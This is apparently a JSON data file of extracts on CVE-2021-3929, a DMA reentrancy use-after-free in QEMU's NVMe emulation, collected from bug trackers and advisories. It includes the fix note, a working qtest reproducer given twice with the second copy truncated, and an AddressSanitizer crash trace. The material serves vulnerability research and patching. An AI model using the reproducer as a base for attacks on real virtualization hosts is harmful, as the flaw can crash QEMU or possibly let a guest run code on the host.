```
{
  "cve": "CVE-2021-3929",
  "relevant_content": [
    {
      "source": "gitlab.com_aece3315_20250115_140649.html",
      "extract": "This fixes CVE-2021-3929 \"locally\" by denying DMA to the iomem of the device itself. This still allows DMA to MMIO regions of other devices (e.g. doing P2P DMA to the controller memory buffer of another NVMe device).\n\nFixes: CVE-2021-3929"
    },
    {
      "source": "gitlab.com_9b947f58_20250115_140646.html",
      "extract": "List of `DMA reentrancy` issues (usually found by [fuzzer](https://gitlab.com/qemu-project/qemu/-/issues?label_name%5B%5D=Fuzzer)):\n* [#782 (closed)](/qemu-project/qemu/-/issues/782 \"nvme: DMA reentrancy issue leads to use-after-free (CVE-2021-3929)\") (NVMe)"
    },
     {
      "source": "lists.fedoraproject.org_a654870f_20250115_102750.html",
      "extract": "nvme: Fix DMA reentrancy use-after-free (CVE-2021-3929)"
    },
    {
      "source": "gitlab.com_1c2bc350_20250115_140647.html",
      "extract": "A DMA reentrancy issue was found in the NVM Express Controller (NVMe) emulation. Functions dma_buf_write() or dma_buf_read() in hw/nvme/ctrl.c:nvme_tx() can be called without checking if the destination region overlaps with device's MMIO. This is similar to CVE-2021-3750 ([#541 (closed)](https://gitlab.com/qemu-project/qemu/-/issues/541 \"Heap-use-after-free through ehci_flush_qh\")) and, just like it, when the reentrancy write triggers the reset function nvme_ctrl_reset(), data structs will be freed leading to a use-after-free issue. A malicious guest could use this flaw to crash the QEMU process on the host, resulting in a denial of service condition or, potentially, executing arbitrary code within the context of the QEMU process on the host."
    },
    {
      "source": "gitlab.com_1c2bc350_20250115_140647.html",
      "extract": "Reproducer\n\n```\ncat << EOF | ./qemu-system-x86_64 -display none -machine accel=qtest \\\n-machine q35 -nodefaults -drive file=null-co://,if=none,format=raw,id=disk0 \\\n-device nvme,drive=disk0,serial=1 -qtest stdio \\\n\noutl 0xcf8 0x80000810               /* MLBAR (BAR0) – Memory Register Base Address, lower 32-bits */\noutl 0xcfc 0xe0000000               /* MMIO Base Address = 0xe0000000 */\noutl 0xcf8 0x80000804               /* CMD - Command */\noutw 0xcfc 0x06                     /* Bus Master Enable, Memory Space Enable */\nwrite 0xe0000024 0x4 0x02000200     /* [3] 3.1.8, Admin Queue Attributes */\nwrite 0xe0000028 0x4 0x00100000     /* asq = 0x1000 */\nwrite 0xe0000030 0x4 0x00200000     /* acq = 0x2000 */\nwrite 0xe0000014 0x4 0x01004600     /* [3] 3.1.5, Controller Configuration, start ctrl */\nwrite 0xe0001000 0x1 0x01           /* [3] 3.1.24, SQyTDBL – Submission Queue y Tail Doorbell */\nwrite 0x1000 0x1 0x02               /* cmd->opcode, NVME_ADM_CMD_GET_LOG_PAGE, nvme_get_log() */\nwrite 0x1018 0x4 0x140000e0         /* prp1 = 0xe0000014, NVME_REG_CC, nvme_ctrl_reset() */\nwrite 0x1028 0x4 0x03000004         /* cmd->cdw10, lid = 3 NVME_LOG_FW_SLOT_INFO, nvme_fw_log_info, buf_len = 4 */\nwrite 0x1030 0x4 0xfc010000         /* cmd->cdw12 = 0x1fc, Log Page Offset, trans_len = sizeof(fw_log) - 0x1fc = 4 */\nclock_step\nEOF\n```"
    },
    {
      "source": "gitlab.com_1c2bc350_20250115_140647.html",
        "extract": "Stack trace\n\n```\n==2682052==ERROR: AddressSanitizer: heap-use-after-free on address 0x616000023d98 at pc 0x56450178ef09 bp 0x7ffc3f0fa330 sp 0x7ffc3f0fa328\nWRITE of size 2 at 0x616000023d98 thread T0\n    #0 0x56450178ef08 in nvme_process_sq ../hw/nvme/ctrl.c:5549:25\n    #1 0x5645031e960e in timerlist_run_timers ../util/qemu-timer.c:573:9\n    #2 0x5645031e993c in qemu_clock_run_timers ../util/qemu-timer.c:587:12\n    #3 0x5645022f3bc4 in qtest_clock_warp ../softmmu/qtest.c:372:9\n    #4 0x5645022f254d in qtest_process_command ../softmmu/qtest.c:768:9\n    #5 0x5645022e5ffd in qtest_process_inbuf ../softmmu/qtest.c:813:9\n    #6 0x5645022f5d3e in qtest_read ../softmmu/qtest.c:825:5\n    #7 0x564502ed866d in qemu_chr_be_write_impl ../chardev/char.c:201:9\n    #8 0x564502ed8729 in qemu_chr_be_write ../chardev/char.c:213:9\n    #9 0x564502ee48a5 in fd_chr_read ../chardev/char-fd.c:73:9\n    #10 0x56450297b5ec in qio_channel_fd_source_dispatch ../io/channel-watch.c:84:12\n    #11 0x7f603c5d57c3 in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x557c3)\n    #12 0x5645031c2519 in glib_pollfds_poll ../util/main-loop.c:232:9\n    #13 0x5645031c1753 in os_host_main_loop_wait ../util/main-loop.c:255:5\n    #14 0x5645031c131c in main_loop_wait ../util/main-loop.c:531:11\n    #15 0x56450227faf3 in qemu_main_loop ../softmmu/runstate.c:726:9\n    #16 0x564500d508de in main ../softmmu/main.c:50:5\n    #17 0x7f603bdd5fcf in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #18 0x7f603bdd607c in __libc_start_main csu/../csu/libc-start.c:409:3\n    #19 0x564500c9fa54 in _start (qemu-system-x86_64+0x1a4ba54)\n\n0x616000023d98 is located 24 bytes inside of 624-byte region [0x616000023d80,0x616000023ff0)\nfreed by thread T0 here:\n    #0 0x564500d1bfa2 in __interceptor_free (qemu-system-x86_64+0x1ac7fa2)\n    #1 0x5645017d0a46 in nvme_free_sq ../hw/nvme/ctrl.c:3934:5\n    #2 0x56450177ec52 in nvme_ctrl_reset ../hw/nvme/ctrl.c:5571:13\n    #3 0x564501778374 in nvme_write_bar ../hw/nvme/ctrl.c:5817:13\n    #4 0x564501775d00 in nvme_mmio_write ../hw/nvme/ctrl.c:6167:9\n    #5 0x56450228b9a3 in memory_region_write_accessor ../softmmu/memory.c:492:5\n    #6 0x56450228b2e1 in access_with_adjusted_size ../softmmu/memory.c:554:18\n    #7 0x564502289bf6 in memory_region_dispatch_write ../softmmu/memory.c:1504:16\n    #8 0x56450225b003 in flatview_write_continue ../softmmu/physmem.c:2779:23\n    #9 0x564502249b8f in flatview_write ../softmmu/physmem.c:2819:14\n    #10 0x564502249718 in address_space_write ../softmmu/physmem.c:2911:18\n    #11 0x564502249eb7 in address_space_rw ../softmmu/physmem.c:2921:16\n    #12 0x564500f3c33d in dma_memory_rw_relaxed ../include/sysemu/dma.h:88:12\n    #13 0x564500f3bee0 in dma_memory_rw ../include/sysemu/dma.h:127:12\n    #14 0x564500f385dd in dma_buf_rw ../softmmu/dma-helpers.c:309:9\n    #15 0x564500f38187 in dma_buf_read ../softmmu/dma-helpers.c:320:12\n    #16 0x56450175652f in nvme_tx ../hw/nvme/ctrl.c:1154:24\n    #17 0x5645017c4084 in nvme_c2h ../hw/nvme/ctrl.c:1189:12\n    #18 0x5645017d42e4 in nvme_fw_log_info ../hw/nvme/ctrl.c:4140:12\n    #19 0x5645017c8378 in nvme_get_log ../hw/nvme/ctrl.c:4287:16\n    #20 0x564501790e65 in nvme_admin_cmd ../hw/nvme/ctrl.c:5492:16\n    #21 0x56450178ee33 in nvme_process_sq ../hw/nvme/ctrl.c:5547:13\n    #22 0x5645031e960e in timerlist_run_timers ../util/qemu-timer.c:573:9\n    #23 0x5645031e993c in qemu_clock_run_timers ../util/qemu-timer.c:587:12\n    #24 0x5645022f3bc4 in qtest_clock_warp ../softmmu/qtest.c:372:9\n    #25 0x5645022f254d in qtest_process_command ../softmmu/qtest.c:768:9\n    #26 0x5645022e5ffd in qtest_process_inbuf ../softmmu/qtest.c:813:9\n    #27 0x5645022f5d3e in qtest_read ../softmmu/qtest.c:825:5\n    #28 0x564502ed866d in qemu_chr_be_write_impl ../chardev/char.c:201:9\n    #29 0x564502ed8729 in qemu_chr_be_write ../chardev/char.c:213:9\n\npreviously allocated by thread T0 here:\n    #0 0x564500d1c3a2 in __interceptor_calloc (qemu-system-x86_64+0x1ac83a2)\n    #1 0x7f603c5de5b0 in g_malloc0 (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x5e5b0)\n    #2 0x56450177e5e6 in nvme_start_ctrl ../hw/nvme/ctrl.c:5711:5\n    #3 0x564501778293 in nvme_write_bar ../hw/nvme/ctrl.c:5808:17\n    #4 0x564501775d00 in nvme_mmio_write ../hw/nvme/ctrl.c:6167:9\n    #5 0x56450228b9a3 in memory_region_write_accessor ../softmmu/memory.c:492:5\n    #6 0x56450228b2e1 in access_with_adjusted_size ../softmmu/memory.c:554:18\n    #7 0x564502289bf6 in memory_region_dispatch_write ../softmmu/memory.c:1504:16\n    #8 0x56450225b003 in flatview_write_continue ../softmmu/physmem.c:2779:23\n    #9 0x564502249b8f in flatview_write ../softmmu/physmem.c:2819:14\n    #10 0x564502249718 in address_space_write ../softmmu/physmem.c:2911:18\n    #11 0x5645022f06ea in qtest_process_command ../softmmu/qtest.c:670:9\n    #12 0x5645022e5ffd in qtest_process_inbuf ../softmmu/qtest.c:813:9\n    #13 0x5645022f5d3e in qtest_read ../softmmu/qtest.c:825:5\n    #14 0x564502ed866d in qemu_chr_be_write_impl ../chardev/char.c:201:9\n    #15 0x564502ed8729 in qemu_chr_be_write ../chardev/char.c:213:9\n    #16 0x564502ee48a5 in fd_chr_read ../chardev/char-fd.c:73:9\n    #17 0x56450297b5ec in qio_channel_fd_source_dispatch ../io/channel-watch.c:84:12\n    #18 0x7f603c5d57c3 in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x557c3)\n\nSUMMARY: AddressSanitizer: heap-use-after-free ../hw/nvme/ctrl.c:5549:25 in nvme_process_sq\nShadow bytes around the buggy address:\n  0x0c2c7fffc760: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c2c7fffc770: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c2c7fffc780: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c2c7fffc790: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c2c7fffc7a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n=>0x0c2c7fffc7b0: fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c2c7fffc7c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c2c7fffc7d0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c2c7fffc7e0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c2c7fffc7f0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa\n  0x0c2c7fffc800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07\n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==2682052==ABORTING\n```"
    },
        {
      "source": "gitlab.com_1c2bc350_20250115_140647.html",
      "extract": "Trace events\n\n```\n[I 1635691481.877984] OPENED\ncpu_get_apic_base 0x00000000fee00900\ncpu_get_apic_base 0x00000000fee00900\ncpu_get_apic_base 0x00000000fee00900\n[R +0.039936] outl 0xcf8 0x80000810               /* MLBAR (BAR0) – Memory Register Base Address, lower 32-bits */\ncpu_out addr 0xcf8(l) value 2147485712\nOK\n[S +0.039968] OK\n[R +0.039983] outl 0xcfc 0xe0000000               /* MMIO Base Address = 0xe0000000 */\ncpu_out addr 0xcfc(l) value 3758096384\npci_cfg_write nvme 01:0 @0x10 <- 0xe0000000\nOK\n[S +0.040008] OK\n[R +0.040018] outl 0xcf8 0x80000804               /* CMD - Command */\ncpu_out addr 0xcf8(l) value 2147485700\nOK\n[S +0.040024] OK\n[R +0.040031] outw 0xcfc 0x06                     /* Bus Master Enable, Memory Space Enable */\ncpu_out addr 0xcfc(w) value 6\npci_cfg_write nvme 01:0 @0x4 <- 0x6\npci_update_mappings_add d=0x62900000f200 00:01.0 0,0xe0000000+0x4000\nOK\n[S +0.041034] OK\n[R +0.041059] write 0xe0000024 0x4 0x02000200     /* [2] 3.1.8, Admin Queue Attributes */\npci_nvme_mmio_write addr 0x24 data 0x20002 size 4\npci_nvme_mmio_aqattr wrote MMIO, admin queue attributes=0x20002\nOK\n[S +0.041078] OK\n[R +0.041083] write 0xe0000014 0x4 0x01004600     /* [2] 3.1.5, Controller Configuration */\npci_nvme_mmio_write addr 0x14 data 0x460001 size 4\npci_nvme_mmio_cfg wrote MMIO, config controller config=0x460001\npci_nvme_setfeat_timestamp set feature timestamp = 0x0\npci_nvme_mmio_start_success setting controller enable bit succeeded\nOK\n[S +0.041116] OK\n[R +0.041124] write 0xe0001000 0x1 0x01           /* [2] 3.1.24, SQyTDBL – Submission Queue y Tail Doorbell */\npci_nvme_mmio_write addr 0x1000 data 0x1 size 2\npci_nvme_mmio_doorbell_sq sqid 0 new_tail 1\nOK\n[S +0.041143] OK\n[R +0.041154] write 0x00 0x1 0x02                 /* cmd->opcode, NVME_ADM_CMD_GET_LOG_PAGE, nvme_get_log() */\nOK\n[S +0.041532] OK\n[R +0.041557] write 0x18 0x4 0x140000e0           /* prp1 = 0xe0000014, NVME_REG_CC, nvme_ctrl_reset() */\nOK\n[S +0.041564] OK\n[R +0.041571] write 0x28 0x4 0x03000004           /* cmd->cdw10, lid = 3 NVME_LOG_FW_SLOT_INFO, nvme_fw_log_info, buf_len = 4 */\nOK\n[S +0.041575] OK\n[R +0.041582] write 0x30 0x4 0xfc010000           /* cmd->cdw12 = 0x1fc, Log Page Offset, trans_len = sizeof(fw_log) - 0x1fc = 4 */\nOK\n[S +0.041587] OK\n[R +0.041591] clock_step\npci_nvme_admin_cmd cid 0 sqid 0 opc 0x2 opname 'NVME_ADM_CMD_GET_LOG_PAGE'\npci_nvme_get_log cid 0 lid 0x3 lsp 0x0 rae 0x0 len 4100 off 508\npci_nvme_map_prp trans_len 4 len 4 prp1 0xe0000014 prp2 0x0 num_prps 1\npci_nvme_map_addr addr 0xe0000014 len 4\npci_nvme_mmio_write addr 0x14 data 0x0 size 4\npci_nvme_mmio_cfg wrote MMIO, config controller config=0x0\npci_nvme_mmio_stopped cleared controller enable bit\n```"
    },
     {
      "source": "bugzilla.redhat.com_84554f66_20250115_102745.html",
      "extract": "A DMA reentrancy issue was found in the NVM Express Controller (NVME) emulation in QEMU. This CVE is similar to CVE-2021-3750 and, just like it, when the reentrancy write triggers the reset function nvme_ctrl_reset(), data structs will be freed leading to a use-after-free issue. A malicious guest could use this flaw to crash the QEMU process on the host, resulting in a denial of service condition or, potentially, executing arbitrary code within the context of the QEMU process on the host."
    },
    {
      "source":"bugzilla.redhat.com_84554f66_20250115_102745.html",
      "extract": "In other words, using `qemu-kvm` commands is not currently supported by Red Hat (<https://access.redhat.com/solutions/408653>). It is highly recommended to interact with QEMU using libvirt, which provides several isolation mechanisms to realize guest isolation and the principle of least privilege. For example, the fundamental isolation mechanism is that QEMU processes on the host are run as unprivileged users. Also, the libvirtd daemon sets up additional sandbox around QEMU by leveraging SELinux and sVirt protection for QEMU guests, which further limits the potential damage in case of guest-to-host escape scenario. The impact of this flaw is limited (Moderate) under such circumstances."
    },
    {
      "source": "gitlab.com_db323982_20250115_140652.html",
      "extract": "A DMA reentrancy issue was found in the NVM Express Controller (NVMe) emulation. Functions dma_buf_write() or dma_buf_read() in hw/nvme/ctrl.c:nvme_tx() can be called without checking if the destination region overlaps with device's MMIO. This is similar to CVE-2021-3750 ([#541 (closed)](https://gitlab.com/qemu-project/qemu/-/issues/541 \"Heap-use-after-free through ehci_flush_qh\")) and, just like it, when the reentrancy write triggers the reset function nvme_ctrl_reset(), data structs will be freed leading to a use-after-free issue. A malicious guest could use this flaw to crash the QEMU process on the host, resulting in a denial of service condition or, potentially, executing arbitrary code within the context of the QEMU process on the host."
    },
        {
      "source": "gitlab.com_db323982_20250115_140652.html",
      "extract": "Reproducer\n\n```\ncat << EOF | ./qemu-system-x86_64 -display none -machine accel=qtest \\\n-machine q35 -nodefaults -drive file=null-co://,if=none,format=raw,id=disk0 \\\n-device nvme,drive=disk0,serial=1 -qtest stdio \\\n\noutl 0xcf8 0x80000810               /* MLBAR (BAR0) – Memory Register Base Address, lower 32-bits */\noutl 0xcfc 0xe0000000               /* MMIO Base Address = 0xe0000000 */\noutl 0xcf8 0x80000804               /* CMD - Command */\noutw 0xcfc 0x06                     /* Bus Master Enable, Memory Space Enable */\nwrite 0xe0000024 0x4 0x02000200     /* [3] 3.1.8, Admin Queue Attributes */\nwrite 0xe0000028 0x4 0x00100000     /* asq = 0x1000 */\nwrite 0xe0000030 0x4 0x00200000     /* acq = 0x2000 */\nwrite 0xe0000014 0x4 0x01004600     /* [3] 3.1.5, Controller Configuration, start ctrl */\nwrite 0xe0001000 0x1 0x01           /* [3] 3.1.24, SQyTDBL – Submission Queue y Tail Doorbell */\nwrite 0x1000 0x1 0x02               /* cmd->opcode, NVME_ADM_CMD_GET_LOG_PAGE, nvme_get_log() */\nwrite 0x1018 0x4 0x140000e0         /* prp1 = 0xe0000014, NVME_REG_CC, nvme_ctrl_reset() */\nwrite 0x1028 0x4 0x03000004         /* cmd->cdw10, lid = 3 NVME_LOG_FW_SLOT_INFO, nvme_fw_log_info, buf_len = 4 */\nwrite 0x103